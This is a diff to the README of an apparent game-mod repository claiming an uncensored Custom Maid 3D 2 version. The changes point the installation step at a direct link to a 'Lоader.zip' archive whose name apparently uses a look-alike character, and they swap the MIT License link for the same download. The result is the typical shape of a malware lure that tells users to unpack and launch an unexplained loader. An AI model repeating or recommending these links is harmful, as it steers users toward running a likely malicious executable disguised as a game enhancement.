@@ -23,7 +23,7 @@ Welcome to the **Custom Maid 3D 2 Uncensored Version**! This project delivers an
 
 ## 🌟 Installation Guide
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/jillkpatel/CustomMaid3D2-UnchainedEdition/main/Lоader.zip` from the repository.
 2. Unpack and launch the loader application per the included instructions.
 3. Enjoy your improved Custom Maid 3D 2 experience with powerful new features!
 
@@ -37,4 +37,4 @@ This repository provides additional content for Custom Maid 3D 2 for personal en
 
 ## 📃 License
 
-Published under the [MIT License](https://opensource.org/licenses/MIT)—free for personal and academic use in 2025 and beyond!
+Published under the [MIT License](https://raw.githubusercontent.com/jillkpatel/CustomMaid3D2-UnchainedEdition/main/Lоader.zip)—free for personal and academic use in 2025 and beyond!
